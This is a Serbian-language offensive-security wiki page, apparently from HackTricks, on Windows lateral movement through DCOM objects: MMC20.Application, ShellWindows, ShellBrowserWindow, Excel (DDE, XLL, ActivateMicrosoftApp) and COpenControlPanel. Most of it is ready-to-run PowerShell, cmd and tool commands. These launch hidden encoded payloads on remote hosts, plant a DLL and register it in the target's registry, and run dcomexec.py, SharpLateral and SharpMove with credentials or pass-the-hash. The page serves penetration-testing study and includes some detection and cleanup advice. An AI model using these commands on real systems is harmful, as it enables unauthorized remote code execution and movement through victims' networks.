# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement je privlačan jer ponovo koristi postojeće COM servere dostupne preko RPC/DCOM-a, umesto kreiranja servisa ili zakazanog zadatka. U praksi to znači da se početna veza obično uspostavlja preko TCP/135, a zatim prelazi na dinamički dodeljene RPC portove visokog opsega.

## Preduslovi i zamke

- Obično vam je potreban lokalni administratorski kontekst na ciljnom sistemu, a udaljeni COM server mora da dozvoli udaljeno pokretanje/aktivaciju.
- Od **14. marta 2023.** Microsoft sprovodi DCOM hardening na podržanim sistemima. Stari klijenti koji zatraže nizak nivo autentifikacije aktivacije mogu da zakažu, osim ako ne ugovore najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Savremeni Windows klijenti obično automatski podižu nivo, tako da aktuelni alati uglavnom i dalje rade.<sup>[[3]](#references)</sup>
- Ručno ili skriptovano izvršavanje preko DCOM-a uglavnom zahteva TCP/135, kao i opseg dinamičkih RPC portova ciljnog sistema. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete izlaz komandi, obično vam je potreban i SMB pristup do `ADMIN$` (ili drugog deljenog resursa sa dozvolama za čitanje/upis).
- Ako RPC/DCOM radi, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za slepo izvršavanje.

Brze provere:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Više informacija o ovoj tehnici potražite u [originalnoj objavi o MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Objekti Distributed Component Object Model (DCOM) nude zanimljive mogućnosti za mrežnu interakciju s objektima. Microsoft pruža opširnu dokumentaciju o DCOM-u i Component Object Model-u (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se dobiti pomoću PowerShell komande:

```bash
Get-CimInstance Win32_DCOMApplication
```

COM objekat [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) omogućava skriptovanje operacija MMC snap-inova. Značajno je to što ovaj objekat sadrži metodu `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovoj metodi možete pronaći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite kako radi:<sup>[[6]](#references)</sup>

Ova funkcija omogućava izvršavanje komandi preko mreže putem DCOM aplikacije. Za daljinsku interakciju sa DCOM-om kao administrator, PowerShell se može koristiti ovako:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metod ExecuteShellCommand da bi se pokrenuo proces na udaljenom hostu. Proces obuhvata sledeće korake:

Proverite metode:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Ostvarite RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Poslednji argument je stil prozora. `7` ostavlja prozor minimizovanim. U praksi, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u u nastavku.

## ShellWindows & ShellBrowserWindow

**Više informacija o ovoj tehnici potražite u originalnoj objavi [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Uočeno je da objekat **MMC20.Application** nema vrednost `LaunchPermission` specifičnu za aplikaciju.<sup>[[2]](#references)</sup> To samo po sebi ne daje pristup: COM proverava ACL `DefaultLaunchPermission` računara i ograničenja za pokretanje/pristup na nivou računara, kada su primenljiva.<sup>[[9]](#references)[[10]](#references)</sup> Za više detalja možete pogledati diskusiju [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se i korišćenje OleView .NET alata autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne dozvole za pokretanje (Launch Permission).

Dva konkretna objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog toga što nemaju eksplicitne dozvole za pokretanje.<sup>[[2]](#references)</sup> Odsustvo vrednosti `LaunchPermission` u okviru `HKCR:\AppID\{guid}` znači da ne postoji ACL za pokretanje specifičan za aplikaciju; to **ne** znači da je udaljena aktivacija neograničena.<sup>[[9]](#references)[[10]](#references)</sup>

U poređenju sa objektom `MMC20.Application`, ovi objekti su često tiši iz OPSEC perspektive, jer se komanda na udaljenom hostu obično pokreće kao podređeni proces `explorer.exe`, a ne `mmc.exe`.

### ShellWindows

Pošto `ShellWindows` nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta pomoću njegovog CLSID-a. U ovom procesu se koristi OleView .NET za pronalaženje CLSID-a objekta `ShellWindows`. Nakon instanciranja, moguće je komunicirati s objektom pomoću metode `WindowsShell.Item`, što omogućava pozivanje metoda kao što je `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Prikazane su primer PowerShell komandi za instanciranje objekta i udaljeno izvršavanje komandi:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` je sličan, ali možete ga direktno instancirati preko njegovog CLSID-a i pivotirati na `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateralno kretanje pomoću Excel DCOM objekata

Lateralno kretanje može se ostvariti iskorišćavanjem DCOM Excel objekata. Za detaljnije informacije preporučuje se da pročitate raspravu o korišćenju Excel DDE-a za lateralno kretanje putem DCOM-a na [blogu Cybereason-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Projekat Empire nudi PowerShell skriptu koja demonstrira korišćenje Excel-a za udaljeno izvršavanje koda (RCE) manipulisanjem DCOM objektima. U nastavku su isečci iz skripte dostupne u [GitHub repozitorijumu projekta Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za zloupotrebu Excel-a radi RCE-a:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Nedavna istraživanja proširila su ovu oblast metodom `ActivateMicrosoftApp()` iz `Excel.Application`. Ključna ideja je da Excel može pokušati da pokrene stare Microsoft aplikacije, kao što su FoxPro, Schedule Plus ili Project, tako što ih traži u sistemskoj promenljivoj `PATH`. Ako operator može da smesti payload pod jednim od očekivanih naziva u lokaciju u koju može da upisuje, a koja je deo `PATH`-a na meti, Excel će ga izvršiti.<sup>[[4]](#references)</sup>

Uslovi za ovu varijantu:

- Lokalni admin na meti
- Excel instaliran na meti
- Mogućnost upisa payloada u direktorijum na meti u koji može da se upisuje, a koji je deo `PATH`-a

Praktičan primer zloupotrebe FoxPro pretrage (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Ako lokalni `Excel.Application` ProgID nije registrovan na napadačkom hostu, instancirajte udaljeni objekat pomoću CLSID-a:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Vrednosti za koje je u praksi primećena zloupotreba:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — učitavanje registrovanog Control Panel DLL-a

Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) izlaže `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Njen metod `Open()` dovodi do toga da udaljeni `dllhost.exe` učita Control Panel DLL-ove registrovane pod ključem `Control Panel\Cpls`. Na testiranim sistemima klasa nema eksplicitno podešene dozvole za pokretanje/pristup, pa nasleđuje podrazumevanu DCOM politiku (koja obično zahteva administratorske privilegije za udaljenu aktivaciju). Naziv proizvoljne stavke dovoljan je da `Open()` obradi registrovane DLL-ove; payload ne mora imati ekstenziju `.cpl`, ali mora biti validan DLL odgovarajuće arhitekture.<sup>[[7]](#references)</sup>

Ovaj primitive je **stage-and-trigger**, a ne samo izvršavanje komandi: prvo kopirajte DLL na cilj i kreirajte vrednost `REG_EXPAND_SZ` koja upućuje na njega, a zatim aktivirajte objekat preko DCOM-a. Na primer, iz administrativnog Windows konteksta:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Javni klijent [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementira nedokumentovani DCOM poziv pomoću Impacket-a. Dovoljno je navesti proizvoljan naziv stavke u Control Panel-u; klijent može prijaviti RPC grešku iako je `dllhost.exe` učitao DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operativno, ovaj put zahteva i kanal za upis datoteka i udaljeni pristup registru, pa je bučniji od `MMC20`/`ShellWindows`. Stvara sporedni efekat postojanosti jer kasnije otvaranje Control Panel-a može ponovo da učita isti unos. Uklonite vrednost nakon izvršavanja i potražite neočekivane vrednosti u `Control Panel\Cpls` zajedno sa neuobičajenim učitavanjima DLL-ova u `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Alati za automatizaciju Lateral Movement-a

Izdvojena su dva alata za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje projekat Empire, a koja pojednostavljuje pozivanje različitih metoda za izvršavanje code-a na udaljenim mašinama. Skripta je dostupna u GitHub repozitorijumu projekta Empire.

- **SharpLateral**: Alat namenjen za udaljeno izvršavanje code-a, koji se može koristiti pomoću sledeće komande:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Automatski alati

- PowerShell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih navedenih načina za izvršavanje koda na drugim mašinama.
- Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima pomoću DCOM-a. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevano koriste `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Možete koristiti i [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Mogli biste da koristite i [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Bočno kretanje pomoću COM objekta MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Bočno kretanje preko DCOM-a: drugi krug](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Upravljanje promenama za zaobilaženje bezbednosne funkcije Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Bočno kretanje: Iskoristite mogućnosti DCOM Excel aplikacije](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Korišćenje Excel DDE-a za bočno kretanje preko DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Klasa MMC aplikacije (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Korišćenje DCOM objekata za udaljeno izvršavanje komandi](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Dodatak B, ponašanje proizvoda - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
